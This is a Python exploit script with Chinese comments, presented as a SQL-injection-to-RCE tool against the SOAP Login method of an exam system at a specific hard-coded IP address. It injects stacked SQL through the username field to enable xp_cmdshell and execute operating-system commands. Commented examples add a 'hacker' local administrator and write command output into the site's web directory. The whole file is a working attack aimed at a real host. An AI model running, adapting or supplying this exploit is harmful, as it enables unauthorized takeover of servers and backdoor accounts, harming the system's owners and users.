import requests

# ================= 配置区域 =================
TARGET_URL = "http://120.55.241.236:999/Models/Exam2020.asmx"
HEADERS = {
    "Content-Type": "text/xml; charset=utf-8",
    "User-Agent": "Eiven.Exam2021 Client"
}

def execute_cmd(cmd):
    """
    通过 SQL 注入利用 xp_cmdshell 执行系统命令
    注意：xp_cmdshell 执行无回显，这里演示开启 xp_cmdshell 并尝试执行
    """
    print(f"[*] 尝试执行命令: {cmd}")

    # 1. 开启 xp_cmdshell (如果未开启)
    # Payload: admin'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
    enable_payload = "admin'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --"
    print("    -> 正在尝试开启 xp_cmdshell...")
    send_login_request(enable_payload)

    # 2. 执行命令
    # Payload: admin'; EXEC xp_cmdshell '...'; --
    # 注意需要转义单引号
    safe_cmd = cmd.replace("'", "''")
    cmd_payload = f"admin'; EXEC xp_cmdshell '{safe_cmd}'; --"
    print("    -> 发送命令 Payload...")
    send_login_request(cmd_payload)

def send_login_request(username):
    # XML 转义
    safe_username = username.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")

    soap_payload = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <Login xmlns="http://tempuri.org/">
          <username>{safe_username}</username>
          <pwd>any</pwd>
        </Login>
      </soap:Body>
    </soap:Envelope>"""

    try:
        headers = HEADERS.copy()
        headers["SOAPAction"] = "http://tempuri.org/Login"

        # 即使 SQL 执行成功，Login 方法也可能返回错误或正常数据，我们主要关注是否发送成功
        response = requests.post(TARGET_URL, data=soap_payload.encode('utf-8'), headers=headers, timeout=5)

        if response.status_code == 200:
            print("    [+] HTTP 200 OK - Payload 发送成功")
        elif response.status_code == 500:
            print("    [!] HTTP 500 - SQL 可能报错，也可能执行成功但破坏了查询结构 (正常现象)")
        else:
            print(f"    [-] HTTP {response.status_code}")

    except requests.exceptions.ConnectionError:
        print("    [!] 连接失败: 服务器未开启。")
    except Exception as e:
        print(f"    [!] 发送异常: {e}")

if __name__ == "__main__":
    print("=== SQL注入 RCE 利用工具 ===")
    print("[*] 目标: Login 方法 SQL 注入")
    print("[*] 权限: sa (推测)")

    # 示例：Ping DNSLog 验证 RCE (请替换为你的 DNSLog)
    # execute_cmd("ping -n 2 127.0.0.1")

    # 示例：添加管理员用户
    # execute_cmd("net user hacker Password123! /add")
    # execute_cmd("net localgroup administrators hacker /add")

    print("\n由于 xp_cmdshell 无回显，建议使用带外通道(OOB)如 DNSLog 验证，或将结果写入 Web 目录。")
    print("示例：将 ipconfig 写入 web 目录 (假设路径已知)")
    # execute_cmd(r"ipconfig > e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web\ip.txt")

    print("\n[!] 请在代码中取消注释并修改 execute_cmd 调用以执行实际攻击。")
